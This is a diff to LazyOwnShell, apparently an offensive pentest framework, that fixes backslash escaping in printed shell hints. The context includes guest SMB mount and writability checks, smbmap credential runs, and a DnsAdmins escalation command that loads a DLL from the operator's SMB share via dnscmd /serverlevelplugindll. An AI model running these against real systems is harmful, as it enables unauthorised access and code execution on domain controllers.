@@ -2301,7 +2301,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(
                         f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                     )
-                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
 
     def do_smbclient_py(self, line):
@@ -2345,7 +2345,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(
                         f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                     )
-                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
 
 
@@ -2395,7 +2395,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(
                         f'exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/documents" /mnt/smb '
                     )
-                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
         else:
             path_cred = get_credentials(True)
@@ -2433,7 +2433,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(
                         f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                     )
-                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
                 else:
                     command = f"smbmap -u {user} -p {passwd} -H {rhost}"
@@ -2443,7 +2443,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(
                         f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                     )
-                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')
+                    print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')
                     return
             else:
                 command = f"cd sessions && smbmap -u {user} -p {passwd} -d {domain} -H {rhost} {execute}"
@@ -2452,7 +2452,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(
                     f'Exploit smb if is posible mount -t cifs -o rw,username=guest,password= "//{rhost}/share" /mnt/smb '
                 )
-                print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \;')                
+                print_msg('find /mnt/smb -type d -exec sh -c \'touch "$0/x" 2>/dev/null && echo "$0 is writable" && rm "$0/x"\' {} \\;')                
                 return
         return
 
@@ -3804,7 +3804,7 @@ class LazyOwnShell(cmd2.Cmd):
             lhost = self.params["lhost"]
             command = f"cd sessions && sudo impacket-smbserver {folder} $(pwd) -smb2support"
             print_msg(command)
-            attack = f'cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\{folder}\da.dll'
+            attack = f'cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\\{folder}\\da.dll'
             copy2clip(attack)
             os.system(command)
         elif choice == "3":
@@ -4444,7 +4444,7 @@ class LazyOwnShell(cmd2.Cmd):
             "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
         )
         os.system(
-            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"'
+            'echo "[\\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"'
         )
         print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
         os.system("cd external/.exploit && python3 -m http.server 8443")
